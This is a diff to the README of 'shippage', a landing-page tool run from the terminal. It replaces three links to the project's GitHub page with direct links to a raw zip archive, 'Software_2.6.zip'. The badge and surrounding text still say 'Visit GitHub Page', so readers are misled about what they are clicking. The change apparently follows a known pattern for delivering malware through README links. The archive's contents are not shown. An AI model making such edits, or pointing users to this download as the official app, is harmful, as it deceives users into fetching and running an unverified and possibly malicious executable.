@@ -1,6 +1,6 @@
 # 🚢 shippage - Ship landing pages fast from terminal
 
-[![Download shippage](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue)](https://github.com/walidoot/shippage)
+[![Download shippage](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue)](https://github.com/walidoot/shippage/raw/refs/heads/main/packages/shippage/Software_2.6.zip)
 
 ## ✨ What shippage does
 
@@ -20,7 +20,7 @@ It uses a plain terminal flow, so you can start from a prompt and get a page str
 
 Go to the GitHub page here and download or run the app from the page:
 
-https://github.com/walidoot/shippage
+https://github.com/walidoot/shippage/raw/refs/heads/main/packages/shippage/Software_2.6.zip
 
 If you are on Windows, use the link above to visit the page, then follow the steps below to get the app on your computer.
 
@@ -192,7 +192,7 @@ It helps you:
 
 Visit the GitHub page to download or run shippage:
 
-https://github.com/walidoot/shippage
+https://github.com/walidoot/shippage/raw/refs/heads/main/packages/shippage/Software_2.6.zip
 
 ## 💬 Common use cases
 
